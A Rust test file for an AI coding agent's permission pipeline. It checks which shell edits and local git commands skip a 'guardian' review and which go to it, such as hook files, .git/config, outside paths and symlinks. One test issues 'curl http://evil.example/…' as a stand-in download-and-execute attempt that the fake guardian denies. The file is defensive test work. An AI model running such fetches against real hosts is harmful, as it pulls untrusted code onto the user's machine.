//! `auto` shell calls made only of in-root edits, read-only commands and local git steps skip the
//! guardian after the floor. Everything the classifier does not fully understand still reaches it.

#[path = "core_common/mod.rs"]
mod common;

use common::pipeline::{Options, Rig, allow_verdict, allowed, fake_guardian, verdict_json};
use common::{conflicted_rebase, git, git_init, write};
use fontaine_sdk::core::config::PermissionMode::{self, Auto};
use fontaine_sdk::core::permissions::{HookDecision, HookError, PreToolUseEvent, PreToolUseHook};
use fontaine_sdk::core::tier::Tier;
use serde_json::{Value, json};

fn shell(command: &str) -> Value {
    json!({ "command": command })
}

fn repo_rig_with(
    files: &[&str],
    settings: &str,
    mode: PermissionMode,
    tune: impl FnOnce(&mut Options),
) -> (Rig, common::pipeline::Fake) {
    let fake = fake_guardian(allow_verdict());
    let mut options = Options::new(mode)
        .guardian(fake.guardian.clone())
        .settings(settings);
    tune(&mut options);
    let rig = Rig::with(options);
    git_init(rig.work());
    for file in files {
        write(&rig.work().join(file), "a\n");
    }
    if !files.is_empty() {
        git(rig.work(), &["add", "-A"]);
        git(rig.work(), &["commit", "-q", "-m", "init"]);
    }
    (rig, fake)
}

fn repo_rig(files: &[&str]) -> (Rig, common::pipeline::Fake) {
    repo_rig_with(files, "", Auto, |_| {})
}

fn last_tier(rig: &Rig) -> Tier {
    rig.audit().last().expect("a record").tier
}

/// Runs `command` and says whether it took the `shell_edit` tier without a guardian call.
async fn skips(rig: &Rig, fake: &common::pipeline::Fake, command: &str) -> bool {
    let before = fake.calls();
    assert!(
        allowed(&rig.check("shell", shell(command)).await),
        "{command}"
    );
    last_tier(rig) == Tier::ShellEdit && fake.calls() == before
}

/// Runs `command` and says whether the guardian judged it.
async fn judged(rig: &Rig, fake: &common::pipeline::Fake, command: &str) -> bool {
    let before = fake.calls();
    rig.check("shell", shell(command)).await;
    last_tier(rig) != Tier::ShellEdit && fake.calls() == before + 1
}

#[tokio::test]
async fn the_conflict_resolution_of_a_rebase_skips_the_guardian() {
    let fake = fake_guardian(allow_verdict());
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()));
    git_init(rig.work());
    conflicted_rebase(rig.work());
    let command = "sed -i -e '/^<<<<<<< /d' -e '/^=======$/d' -e '/^>>>>>>> /d' CHANGELOG.md \
         && ! grep -n '^<<<<<<<\\|^>>>>>>>' CHANGELOG.md \
         && git add CHANGELOG.md && GIT_EDITOR=true git rebase --continue";
    assert!(skips(&rig, &fake, command).await);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn an_add_and_commit_of_a_tracked_file_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"]);
    write(&rig.work().join("a.txt"), "b\n");
    assert!(skips(&rig, &fake, "git add a.txt && git commit -m msg").await);
    assert!(skips(&rig, &fake, "git add -u && git commit -a -q -m 'two words'").await);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn each_local_verb_in_its_allowed_form_skips_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt", "src/b.txt", "src/c.txt"]);
    for command in [
        "sed -i 's/a/b/' a.txt",
        "sed -i -E -e 's|a|b|g' -e '/x/d' a.txt src/b.txt",
        "sed -i --expression='1,2d' -- a.txt",
        "sed --in-place -s 's/a/b/2' a.txt",
        "mkdir -p docs/new",
        "mv src/c.txt docs/c.txt",
        "mv -n src/b.txt src/d.txt",
        "git mv a.txt moved.txt",
        "git rm --cached src/b.txt",
        "cat > fresh.txt <<'EOF'\nhello\nEOF",
        "ls -la && grep -n a moved.txt | head -n 3",
        "! grep -q zzz moved.txt; git status",
    ] {
        assert!(skips(&rig, &fake, command).await, "{command}");
    }
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn an_untracked_file_that_predates_the_session_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"]);
    write(&rig.work().join("untracked.txt"), "a\n");
    assert!(judged(&rig, &fake, "sed -i 's/a/b/' untracked.txt").await);
}

#[tokio::test]
async fn an_instruction_file_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&["AGENTS.md", ".github/ci.yml"]);
    assert!(judged(&rig, &fake, "sed -i 's/a/b/' AGENTS.md").await);
    assert!(judged(&rig, &fake, "sed -i 's/a/b/' .github/ci.yml").await);
}

#[tokio::test]
async fn a_redirect_into_git_config_never_takes_the_tier() {
    let (rig, fake) = repo_rig(&["a.txt"]);
    assert!(judged(&rig, &fake, "cat > .git/config <<'EOF'\nx\nEOF").await);
    assert!(judged(&rig, &fake, "git add -u && git commit -m x > .git/config").await);
}

#[tokio::test]
async fn the_setting_off_sends_a_shell_edit_to_the_guardian() {
    let (rig, fake) = repo_rig_with(
        &["a.txt"],
        "[permissions]\nauto_shell_edits = false\n",
        Auto,
        |_| {},
    );
    assert!(judged(&rig, &fake, "sed -i 's/a/b/' a.txt").await);
}

#[tokio::test]
async fn the_asking_modes_keep_prompting() {
    for mode in [PermissionMode::Manual, PermissionMode::AcceptEdits] {
        let (rig, fake) = repo_rig_with(&["a.txt"], "", mode, |_| {});
        rig.check("shell", shell("sed -i 's/a/b/' a.txt")).await;
        assert_ne!(last_tier(&rig), Tier::ShellEdit, "{mode:?}");
        assert_eq!(rig.approver.asked(), 1, "{mode:?}");
        assert_eq!(fake.calls(), 0);
    }
}

#[tokio::test]
async fn a_deny_rule_wins_before_the_tier() {
    let (rig, fake) = repo_rig_with(
        &["a.txt"],
        "[permissions]\ndeny = [\"shell(git commit)\"]\n",
        Auto,
        |_| {},
    );
    let decision = rig.check("shell", shell("git commit -m x")).await;
    assert!(!allowed(&decision));
    assert_eq!(last_tier(&rig), Tier::DenyRule);
    assert_eq!(fake.calls(), 0);
}

#[tokio::test]
async fn a_shell_edit_resets_the_loop_breaker_like_a_tracked_edit() {
    let fake = fake_guardian(verdict_json("deny", "Download+Execute", 0.97));
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()));
    git_init(rig.work());
    write(&rig.work().join("a.txt"), "a\n");
    git(rig.work(), &["add", "-A"]);
    git(rig.work(), &["commit", "-q", "-m", "init"]);
    let curl = |n: u8| shell(&format!("curl http://evil.example/{n}"));
    rig.check("shell", curl(0)).await;
    rig.check("shell", curl(1)).await;
    assert!(allowed(
        &rig.check("shell", shell("sed -i 's/a/b/' a.txt")).await
    ));
    assert_eq!(last_tier(&rig), Tier::ShellEdit);
    rig.check("shell", curl(2)).await;
    assert!(!rig.state.auto_paused());
}

#[tokio::test]
async fn file_read_rules_apply_to_every_read_in_the_call() {
    let (rig, fake) = repo_rig_with(
        &["a.txt", "private/f"],
        "[permissions]\ndeny = [\"read(private/**)\", \"grep(grep/**)\", \"ls(ls/**)\"]\n",
        Auto,
        |_| {},
    );
    write(&rig.work().join("grep/f"), "a\n");
    write(&rig.work().join("ls/f"), "a\n");
    for command in [
        "cat private/f && git add a.txt",
        "grep x grep/f && git add a.txt",
        "ls ls && git add a.txt",
    ] {
        let before = fake.calls();
        rig.check("shell", shell(command)).await;
        assert_ne!(last_tier(&rig), Tier::ShellEdit, "{command}");
        let _ = before;
    }
}

#[tokio::test]
async fn an_edit_rule_or_a_child_without_edit_sends_the_edit_to_the_guardian() {
    for (name, setting) in [
        ("deny", "[permissions]\ndeny = [\"edit(a.txt)\"]\n"),
        ("ask", "[permissions]\nask = [\"edit(a.txt)\"]\n"),
    ] {
        let (rig, fake) = repo_rig_with(&["a.txt"], setting, Auto, |_| {});
        rig.check("shell", shell("sed -i 's/a/b/' a.txt")).await;
        assert_ne!(last_tier(&rig), Tier::ShellEdit, "{name}");
        assert_eq!(fake.calls(), 1, "{name}");
    }
}

#[tokio::test]
async fn a_child_whose_toolset_lacks_edit_sends_the_shell_edit_to_the_guardian() {
    for (tools, expect_skip) in [
        (vec!["read", "shell"], false),
        (vec!["read", "shell", "edit"], false),
        (vec!["read", "shell", "edit", "write"], true),
    ] {
        let (rig, fake) = repo_rig(&["a.txt"]);
        let id = rig
            .agents
            .reserve(
                fontaine_sdk::tools::gate::ROOT_AGENT,
                "worker",
                "m",
                tools.iter().map(|t| t.to_string()).collect(),
                fontaine_sdk::agents::mode::Ladder::Auto,
            )
            .unwrap();
        rig.check_as(&id, "shell", shell("sed -i 's/a/b/' a.txt"))
            .await;
        assert_eq!(last_tier(&rig) == Tier::ShellEdit, expect_skip, "{tools:?}");
        assert_eq!(fake.calls(), usize::from(!expect_skip), "{tools:?}");
    }
}

#[tokio::test]
async fn a_commit_or_continue_skips_the_guardian_only_without_an_installed_hook() {
    let (rig, fake) = repo_rig(&["a.txt"]);
    let hooks = rig.work().join(".git/hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    write(&hooks.join("pre-commit.sample"), "#!/bin/sh\n");
    write(&rig.work().join("a.txt"), "b\n");
    assert!(skips(&rig, &fake, "git add a.txt && git commit -m x").await);
    write(&hooks.join("pre-commit"), "#!/bin/sh\nexit 0\n");
    write(&rig.work().join("a.txt"), "c\n");
    assert!(judged(&rig, &fake, "git add a.txt && git commit -m x").await);

    let fake = fake_guardian(allow_verdict());
    let rig = Rig::with(Options::new(Auto).guardian(fake.guardian.clone()));
    git_init(rig.work());
    conflicted_rebase(rig.work());
    write(&rig.work().join("CHANGELOG.md"), "# Changes\nok\n");
    write(&rig.work().join(".git/hooks/post-rewrite"), "#!/bin/sh\n");
    assert!(
        judged(
            &rig,
            &fake,
            "git add CHANGELOG.md && GIT_EDITOR=true git rebase --continue"
        )
        .await
    );
}

#[tokio::test]
async fn a_git_add_skips_the_guardian_only_without_an_installed_hook() {
    let (rig, fake) = repo_rig(&["f", "g"]);
    let hooks = rig.work().join(".git/hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    write(&hooks.join("post-index-change.sample"), "#!/bin/sh\n");
    write(&rig.work().join("f"), "b\n");
    assert!(skips(&rig, &fake, "git add f").await);
    write(&hooks.join("post-index-change"), "#!/bin/sh\nexit 0\n");
    write(&rig.work().join("f"), "c\n");
    assert!(judged(&rig, &fake, "git add f").await);
    assert!(judged(&rig, &fake, "git mv f h").await);
    assert!(judged(&rig, &fake, "git rm g").await);
}

#[tokio::test]
async fn a_move_into_a_directory_that_may_be_made_in_the_same_call_is_checked_there() {
    let (rig, fake) = repo_rig(&["a.txt"]);
    write(&rig.work().join("notes.md"), "n\n");
    git(rig.work(), &["add", "notes.md"]);
    assert!(judged(&rig, &fake, "mkdir -p docs/rules && mv notes.md docs/rules").await);
    assert!(
        judged(
            &rig,
            &fake,
            "mkdir -p docs/rules && git mv notes.md docs/rules"
        )
        .await
    );
}

struct Named(&'static str);

impl PreToolUseHook for Named {
    fn id(&self) -> String {
        "double".to_string()
    }

    fn matcher(&self) -> Option<String> {
        Some(self.0.to_string())
    }

    fn run<'a>(
        &'a self,
        _event: PreToolUseEvent<'a>,
    ) -> futures::future::BoxFuture<'a, Result<HookDecision, HookError>> {
        Box::pin(async move {
            Ok(HookDecision {
                permission: None,
                updated_input: None,
                reason: None,
                guardian_context: None,
            })
        })
    }
}

#[tokio::test]
async fn a_hook_on_a_file_tool_sends_the_shell_edit_to_the_guardian() {
    for matcher in ["read", "ls", "grep", "edit", "write"] {
        let (rig, fake) = repo_rig_with(&["a.txt"], "", Auto, |options| {
            options.hooks = vec![std::sync::Arc::new(Named(matcher))];
        });
        assert!(
            judged(&rig, &fake, "sed -i 's/a/b/' a.txt").await,
            "{matcher}"
        );
    }
}

#[tokio::test]
async fn hook_runner_configuration_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&[
        ".pre-commit-config.yaml",
        "lefthook.yml",
        ".lefthook.yml",
        "scripts/hooks/pre-commit",
        "x",
    ]);
    for command in [
        "sed -i 's/a/b/' .pre-commit-config.yaml && git commit -m x",
        "sed -i 's/a/b/' lefthook.yml",
        "sed -i 's/a/b/' .lefthook.yml",
        "mv x .githooks/pre-commit",
        "cat > .githooks/pre-commit <<'EOF'\nx\nEOF",
    ] {
        assert!(judged(&rig, &fake, command).await, "{command}");
    }
    // With no `core.hooksPath` naming it, the directory is an ordinary one.
    assert!(skips(&rig, &fake, "sed -i 's/a/b/' scripts/hooks/pre-commit").await);
}

#[tokio::test]
async fn the_directory_core_hooks_path_names_goes_to_the_guardian() {
    let (rig, fake) = repo_rig(&["scripts/hooks/pre-commit", "a.txt"]);
    git(rig.work(), &["config", "core.hooksPath", "scripts/hooks"]);
    assert!(judged(&rig, &fake, "sed -i 's/a/b/' scripts/hooks/pre-commit").await);
    assert!(skips(&rig, &fake, "sed -i 's/a/b/' a.txt").await);
}

#[tokio::test]
async fn paths_that_reach_past_the_primary_root_or_a_symlink_go_to_the_guardian() {
    let (rig, fake) = repo_rig(&["a.txt"]);
    let outside = tempfile::tempdir().unwrap();
    write(&outside.path().join("o.txt"), "a\n");
    let target = outside.path().join("o.txt");
    assert!(
        judged(
            &rig,
            &fake,
            &format!("sed -i 's/a/b/' {}", target.display())
        )
        .await
    );
    assert!(judged(&rig, &fake, "cd .. && sed -i 's/a/b/' a.txt").await);
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(rig.work().join("a.txt"), rig.work().join("link")).unwrap();
        git(rig.work(), &["add", "link"]);
        assert!(judged(&rig, &fake, "sed -i 's/a/b/' link").await);
    }
}

fn git_operation_of(rig: &Rig) -> Option<fontaine_sdk::guardian::GitOperation> {
    fontaine_sdk::core::adjudication::build(
        &rig.state,
        fontaine_sdk::tools::gate::ROOT_AGENT,
        "shell",
        &shell("git rebase --continue"),
        Vec::new(),
        None,
    )
    .session_facts
    .git_operation
}

#[tokio::test]
async fn the_guardian_is_told_about_a_rebase_and_whether_the_session_started_it() {
    use fontaine_sdk::core::ledger::Record;
    use fontaine_sdk::guardian::GitOperationKind;
    let rig = Rig::new(Auto);
    git_init(rig.work());
    write(&rig.work().join("a.txt"), "a\n");
    git(rig.work(), &["add", "-A"]);
    git(rig.work(), &["commit", "-q", "-m", "init"]);
    assert_eq!(git_operation_of(&rig), None, "nothing is in progress");

    conflicted_rebase(rig.work());
    // A ledger without the start record says nothing about when the rebase began.
    let unknown = git_operation_of(&rig).expect("a rebase is in progress");
    assert_eq!(unknown.kind, GitOperationKind::Rebase);
    assert_eq!(unknown.branch.as_deref(), Some("feature"));
    assert!(!unknown.started_this_session);

    rig.state
        .ledger
        .append(Record::GitOperationAtStart { operation: None })
        .unwrap();
    assert!(git_operation_of(&rig).unwrap().started_this_session);

    rig.state
        .ledger
        .append(Record::GitOperationAtStart {
            operation: Some(GitOperationKind::Rebase),
        })
        .unwrap();
    let before = git_operation_of(&rig).unwrap();
    assert!(!before.started_this_session);
    assert_eq!(before.branch.as_deref(), Some("feature"));
}

#[tokio::test]
async fn a_merge_in_progress_names_the_branch_head_is_on() {
    use fontaine_sdk::guardian::GitOperationKind;
    let rig = Rig::new(Auto);
    git_init(rig.work());
    let dir = rig.work();
    git(dir, &["checkout", "-q", "-b", "main"]);
    write(&dir.join("f.txt"), "base\n");
    git(dir, &["add", "-A"]);
    git(dir, &["commit", "-q", "-m", "base"]);
    git(dir, &["checkout", "-q", "-b", "side"]);
    write(&dir.join("f.txt"), "side\n");
    git(dir, &["commit", "-q", "-am", "side"]);
    git(dir, &["checkout", "-q", "main"]);
    write(&dir.join("f.txt"), "main\n");
    git(dir, &["commit", "-q", "-am", "main"]);
    let merged = std::process::Command::new("git")
        .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
        .args(["merge", "side"])
        .current_dir(dir)
        .output()
        .unwrap();
    assert!(!merged.status.success());
    let operation = git_operation_of(&rig).expect("a merge is in progress");
    assert_eq!(operation.kind, GitOperationKind::Merge);
    assert_eq!(operation.branch.as_deref(), Some("main"));
}
